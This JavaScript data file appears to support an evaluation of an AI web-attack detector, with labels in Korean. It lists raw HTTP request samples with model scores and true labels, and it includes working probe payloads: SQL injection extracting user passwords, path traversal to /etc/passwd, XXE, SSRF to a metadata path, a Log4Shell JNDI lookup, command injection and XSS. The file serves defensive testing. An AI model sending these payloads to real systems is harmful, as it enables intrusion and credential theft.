// _tmp_presentation/xoar_ai_eval_20260909/evidence.mjs
export const samples = [
  ['S01',0.47,'공격','정상','상대경로 리디렉션','/home으로 이동하는 상대경로이며 외부 URL이나 헤더 삽입이 없다.',String.raw`GET /redirect?next=%2Fhome HTTP/1.1\r\nHost: host-37\r\nConnection: close`],
  ['S02',0.39,'정상','정상','파일 업로드 발췌','이름과 Windows 파일 경로만으로 공격을 입증할 수 없다. 파일 본문은 제공되지 않았다.',String.raw`POST /upload HTTP/1.1\r\nHost: host-11\r\nContent-Type: multipart/form-data; boundary=EVALBOUNDARY\r\n\r\n--EVALBOUNDARY\r\nContent-Disposition: form-data; name="홍길동 11"; filename="C:/ProgramData/Your-Company/SecurityData/event-11.dat"`],
  ['S03',0.48,'공격','정상','일반 로그인','삽입 구문이 없는 단건 로그인이다. 비밀번호 문자열만으로 실패나 무차별 대입을 확정할 수 없다.',String.raw`POST /login HTTP/1.1\r\nHost: host-11\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=user01&password=incorrect-password`],
  ['S04',0.30,'정상','정상','상태 점검','/health와 kube-probe User-Agent가 헬스체크 요청 형식에 부합한다.',String.raw`GET /health HTTP/1.1\r\nHost: host-22\r\nUser-Agent: kube-probe/1.30\r\nAccept: */*`],
  ['S05',0.31,'공격','정상','JSON 검색 조건','union은 JSON 필드의 값이다. SQL UNION SELECT 삽입 구문이 아니다.',String.raw`POST /api/search HTTP/1.1\r\nHost: host-11\r\nContent-Type: application/json\r\n\r\n{"operator":"union","fields":["name","department"],"page":1}`],
  ['S06',0.60,'공격','정상','정상 ping 요청','localhost에 count=4를 지정했다. 명령 연결자나 셸 확장 구문이 없다.',String.raw`POST /tools/ping HTTP/1.1\r\nHost: host-12\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nhost=127.0.0.1&count=4`],
  ['S07',0.35,'정상','정상','일반 파일 다운로드','파일명 안의 ..는 상위 디렉터리 이동 구분자 ../와 다르다.',String.raw`GET /download?file=quarterly..final.pdf HTTP/1.1\r\nHost: host-41\r\nAccept: application/pdf`],
  ['S08',0.43,'공격','정상','기술 문서 검색','HTML script 요소를 설명하는 자연어 검색이다. 실행 가능한 script 태그가 없다.',String.raw`GET /docs/search?q=HTML%20script%20element%20reference HTTP/1.1\r\nHost: host-3\r\nReferer: [https://host-3/docs](https://host-3/docs)`],
  ['S09',0.27,'정상','정상','자연어 검색','건강보험 선택에 관한 문장이다. SQL 구문을 구성하는 SELECT 삽입이 없다.',String.raw`GET /search?q=how%20to%20select%20a%20health%20plan HTTP/1.1\r\nHost: host-31\r\nAccept: text/html`],
  ['S10',0.65,'공격','정상','상품 목록 조회','상품 ID와 가격 오름차순 정렬 조건이다. SQL 연산자나 주석 삽입이 없다.',String.raw`GET /products?id=10&sort=price&direction=asc HTTP/1.1\r\nHost: host-7\r\nUser-Agent: Mozilla/5.0`],
  ['S11',0.43,'공격','공격','CRLF / 헤더 삽입','%0D%0A 뒤에 X-Test-Injected 헤더를 추가하는 삽입 탐침이다.',String.raw`GET /redirect?next=%2Fhome%0D%0AX-Test-Injected%3A%20true HTTP/1.1\r\nHost: host-37\r\nConnection: close`],
  ['S12',0.46,'공격','공격','XML 외부 엔터티','디코딩 시 DOCTYPE과 SYSTEM 외부 엔터티가 /etc/hostname을 참조한다.',String.raw`POST /api/import HTTP/1.1\r\nHost: host-11\r\nContent-Type: application/xml\r\n\r\n%3C%21DOCTYPE%20r%20%5B%3C%21ENTITY%20x%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fhostname%22%3E%5D%3E%3Cr%3E%26x%3B%3C%2Fr%3E`],
  ['S13',0.37,'공격','공격','서버 템플릿 삽입 모사','중괄호 템플릿 식 평가를 탐색하는 형태다. 역슬래시의 실제 전송 여부는 확인이 필요하다.',String.raw`GET /welcome?name=%7B%7B7\*7%7D%7D HTTP/1.1\r\nHost: host-11\r\nAccept: text/html`],
  ['S14',0.67,'공격','공격','SSRF 모사','URL 가져오기 기능에 /latest/meta-data 경로를 입력했다. 목적지는 문서용 주소다.',String.raw`POST /preview HTTP/1.1\r\nHost: host-22\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nurl=http%3A%2F%2F192.0.2.20%2Flatest%2Fmeta-data`],
  ['S15',0.51,'공격','공격','Log4Shell 패턴 모사','User-Agent에 JNDI LDAP 조회 패턴을 넣었다. 역슬래시와 실행 환경에 따라 성립 여부가 달라진다.','GET / HTTP/1.1\\r\\nHost: host-11\\r\\nUser-Agent: ${jndi:ldap\\://192.0.2.123:1389/test-only}\\r\\nX-Test-Marker: AI-EVAL-9006'],
  ['S16',0.60,'공격','공격','OS 명령 삽입','디코딩 시 ;id;uname -a를 연결해 추가 OS 명령 실행을 시도한다.',String.raw`POST /tools/ping HTTP/1.1\r\nHost: host-12\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nhost=127.0.0.1%3Bid%3Buname%20-a`],
  ['S17',0.63,'공격','공격','경로 순회','반복 ../로 상위 디렉터리를 벗어나 /etc/passwd 접근을 시도한다.',String.raw`GET /download?file=../../../../etc/passwd HTTP/1.1\r\nHost: host-41\r\nAccept: application/octet-stream`],
  ['S18',0.45,'공격','공격','XSS 삽입','디코딩 시 <script>alert(1)</script>를 포함하는 스크립트 삽입 탐침이다.',String.raw`GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1\r\nHost: host-3\r\nReferer: [https://host-3/](https://host-3/)`],
  ['S19',0.57,'공격','공격','시간 지연 SQL 삽입','인용부호 종료, AND SLEEP(5), 주석을 조합한 시간 지연형 SQL 삽입이다.',String.raw`POST /login HTTP/1.1\r\nHost: host-31\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=admin%27%20AND%20SLEEP%285%29--&password=test`],
  ['S20',1.00,'공격','공격','UNION SQL 삽입','UNION SELECT로 users 테이블의 username과 password 조회를 시도한다.',String.raw`GET /products?id=10%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\r\nHost: host-7\r\nUser-Agent: Mozilla/5.0`]
].map(([id,score,predicted,truth,type,reason,raw])=>({id,score,predicted,truth,type,reason,raw,outcome:truth==='공격'?(predicted==='공격'?'TP':'FN'):(predicted==='공격'?'FP':'TN')}));

export const ticketsA = [
  ['SR260908-AW1-00000380','14:19:07'],['SR260908-AW1-00000379','14:18:58'],
  ['SR260908-AW1-00000378','14:18:58'],['SR260908-AW1-00000377','14:18:40'],
  ['SR260908-AW1-00000376','14:18:40'],['SR260908-AW1-00000375','14:18:40'],
  ['SR260908-AW1-00000374','14:18:22'],['SR260908-AW1-00000373','14:18:22'],
  ['SR260908-AW1-00000372','14:18:22'],['SR260908-AW1-00000371','14:18:13']
];
export const ticketsB = [
  ['SR260908-AW1-00000456','16:55:39'],['SR260908-AW1-00000455','16:55:39'],
  ['SR260908-AW1-00000454','16:55:39'],['SR260908-AW1-00000452','16:55:21'],
  ['SR260908-AW1-00000451','16:55:21'],['SR260908-AW1-00000450','16:55:21'],
  ['SR260908-AW1-00000449','16:55:12'],['SR260908-AW1-00000448','16:55:12'],
  ['SR260908-AW1-00000447','16:55:12'],['SR260908-AW1-00000446','16:54:54']
];
export const sources = {
  sql:'https://owasp.org/www-community/attacks/SQL_Injection',
  path:'https://owasp.org/www-community/attacks/Path_Traversal',
  crlf:'https://owasp.org/www-community/vulnerabilities/CRLF_Injection',
  xxe:'https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection/',
  ssti:'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Injection_Testing/18-Testing_for_Server-side_Template_Injection',
  ssrf:'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html',
  log4j:'https://logging.apache.org/security.html',
  command:'https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection/',
  probes:'https://kubernetes.io/docs/concepts/workloads/pods/probes/',
  auth:'https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html',
  rfc:'https://www.rfc-editor.org/info/rfc5737/'
};
